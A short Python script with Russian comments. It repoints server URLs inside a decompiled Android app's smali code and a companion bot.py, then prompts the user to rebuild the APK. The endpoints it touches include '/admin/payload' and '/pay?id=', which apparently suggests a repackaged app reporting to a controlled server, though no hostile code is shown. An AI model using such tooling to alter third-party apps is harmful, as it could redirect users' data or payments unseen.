"""
Скрипт для обновления URL сервера в приложении и боте
"""
import re

def update_url(new_url):
    """Обновить URL во всех файлах"""
    
    # Убираем trailing slash
    new_url = new_url.rstrip('/')
    
    print(f"🔄 Обновление URL на: {new_url}")
    
    # 1. Обновляем MainActivity.smali
    smali_file = "apktool_out/smali_classes3/com/roder300/kozen/MainActivity.smali"
    
    try:
        with open(smali_file, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Заменяем все URL
        content = re.sub(
            r'const-string v0, "http[s]?://[^"]+/register"',
            f'const-string v0, "{new_url}/register"',
            content
        )
        content = re.sub(
            r'const-string v0, "http[s]?://[^"]+/admin/payload"',
            f'const-string v0, "{new_url}/admin/payload"',
            content
        )
        content = re.sub(
            r'const-string p0, "http[s]?://[^"]+"',
            f'const-string p0, "{new_url}"',
            content
        )
        content = re.sub(
            r'const-string v2, "http[s]?://[^"]+/pay\?id="',
            f'const-string v2, "{new_url}/pay?id="',
            content
        )
        
        with open(smali_file, 'w', encoding='utf-8') as f:
            f.write(content)
        
        print("✅ MainActivity.smali обновлен")
    except Exception as e:
        print(f"❌ Ошибка обновления MainActivity.smali: {e}")
    
    # 2. Обновляем bot.py
    try:
        with open('bot.py', 'r', encoding='utf-8') as f:
            content = f.read()
        
        content = re.sub(
            r"BASE = 'http[s]?://[^']+'",
            f"BASE = '{new_url}'",
            content
        )
        
        with open('bot.py', 'w', encoding='utf-8') as f:
            f.write(content)
        
        print("✅ bot.py обновлен")
    except Exception as e:
        print(f"❌ Ошибка обновления bot.py: {e}")
    
    print("\n✅ Готово! Теперь пересобери APK: .\\build_and_install.ps1")

if __name__ == '__main__':
    url = input("Введи URL сервера (например, https://your-app.onrender.com): ").strip()
    update_url(url)
